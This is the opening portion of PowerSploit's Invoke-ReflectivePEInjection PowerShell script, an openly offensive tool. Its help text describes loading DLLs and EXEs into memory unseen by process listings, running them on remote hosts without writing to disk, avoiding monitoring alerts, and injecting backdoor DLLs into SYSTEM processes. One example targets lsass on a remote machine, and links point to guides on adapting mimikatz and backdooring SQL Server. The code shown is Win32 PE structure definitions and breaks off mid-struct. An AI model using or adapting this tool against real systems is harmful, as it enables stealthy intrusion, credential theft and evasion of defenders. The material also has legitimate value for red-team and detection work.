function Invoke-ReflectivePEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process,
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints,
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the
remote process.

PowerSploit Function: Invoke-ReflectivePEInjection  
Author: Joe Bialek, Twitter: @JosephBialek  
Code review and modifications: Matt Graeber, Twitter: @mattifestation  
License: BSD 3-Clause  
Required Dependencies: None  
Optional Dependencies: None  

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
    Options: String, WString, Void. See notes for more information.
    IMPORTANT: For DLLs being loaded remotely, only Void is supported.

.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.

.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-ReflectivePEInjection more than once.

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
    the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
    -Can return DLL output to user when run remotely or locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running pentest tools on remote computers without triggering process monitoring alerts.
    -By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
    -Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
    -Cleans up memory in the PS process once the DLL finishes executing.
    -Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
    -Can NOT return DLL output to the user when run remotely OR locally.
    -Does NOT clean up memory in the remote process if/when DLL finishes execution.
    -Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
    -Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t*   : FuncReturnType = WString
char*      : FuncReturnType = String
void       : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString    : WStringFunc
String     : StringFunc
Void       : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>

[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseSingularNouns', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSPossibleIncorrectComparisonWithNull', '')]
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,

    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,

    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
    [String]
    $FuncReturnType = 'Void',

    [Parameter(Position = 3)]
    [String]
    $ExeArgs,

    [Parameter(Position = 4)]
    [Int32]
    $ProcId,

    [Parameter(Position = 5)]
    [String]
    $ProcName,

    [Switch]
    $ForceASLR,

    [Switch]
    $DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,

        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
    )

    ###################################
    ##########  Win32 Stuff  ##########
    ###################################
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        #Define all the structures/enums that will be used
        #   This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############    ENUM    ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ###########    STRUCT    ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64

        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
